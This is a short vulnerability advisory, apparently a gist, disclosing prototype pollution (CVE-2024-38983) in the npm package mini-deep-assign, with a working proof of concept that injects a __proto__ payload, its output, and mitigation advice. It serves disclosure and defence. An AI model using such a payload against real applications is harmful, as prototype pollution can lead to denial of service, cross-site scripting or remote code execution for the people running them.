[CVE-2024-38983] Prototype Pollution Vulnerability Affecting mini-deep-assign, version 0.0.8

 [Raw](/mestrtee/f82d0c3a8fe3a125f06425caef5d22ed/raw/5b5ed038b30f231a18a694442f8c80b5643a402a/mini-deep-assign-pp.md)

[**mini-deep-assign-pp.md**](#file-mini-deep-assign-pp-md)

## Overview

All versions of this module are potentially affected by prototype pollution. The vulnerability located at `Module.assign (/lib/index.js:91)`. when `_assign()` method
used to recursively copy source property to the destination. An attacker can be exploit this method to copy malicious property to the built-in Object.prototype through the special properties `__proto__` or `constructor.prototype`.
Thus, the attacker can use one of these properties to pollute the application logic that can be escalated to Denial of service,
remote code execution or cross-site scripting attacks.

## PoC

```
(async () => {
  const lib = await import('mini-deep-assign');

var BAD_JSON = JSON.parse('{"__proto__":{"polluted":true}}');
var victim = {}
console.log("Before Attack: ", JSON.stringify(victim.__proto__));
try {
  lib.default ({}, BAD_JSON)
} catch (e) { }
console.log("After Attack: ", JSON.stringify(victim.__proto__));
delete Object.prototype.polluted;
})();
```

Output:

```
Before Attack:  {}
After Attack:  {"polluted":true}
```

Output of a successful fix:

```
Before Attack:  {}
After Attack:  {}
```

## How to prevent:

No updates were provided by the maintainer. Users of this module are urged to implement proper santization and validation over user's supplied inputs, such as blocking inputs containing `__proto__` and `contructor.prototype`
